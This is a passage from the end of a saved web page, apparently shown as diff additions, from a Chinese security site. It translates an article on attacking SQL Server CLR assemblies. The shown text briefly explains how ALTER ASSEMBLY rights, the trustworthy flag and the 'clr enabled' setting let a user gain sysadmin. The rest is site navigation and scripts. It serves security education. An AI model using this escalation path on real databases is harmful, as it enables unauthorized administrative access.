ASSEMBLY权限，则可以使用自定义CLR获取sysadmin权限，该自定义CLR将在SQL Server服务帐户（由sysadmin默认）。但是，要成功创建CLR程序集的数据库，必须将&#39;is_trustworthy&#39;标志设置为&#39;1&#39;并启用&#39;clr enabled&#39;服务器设置。默认情况下，只有msdb数据库是可靠的，并且禁用“clr enabled”设置。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我从来没有看到明确分配给SQL登录的CREATE或ALTER ASSEMBLY权限。但是，我已经看到应用程序SQL登录添加到“db_ddladmin”数据库角色，并且具有“ALTER ASSEMBLY”权限。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注意：SQL Server 2017引入了“clr strict security”配置。 Microsoft文档规定，需要禁用该设置以允许创建UNSAFE或EXTERNAL程序集。</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank">原文链接：https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】攻击SQL Server CLR程序集 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4197" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
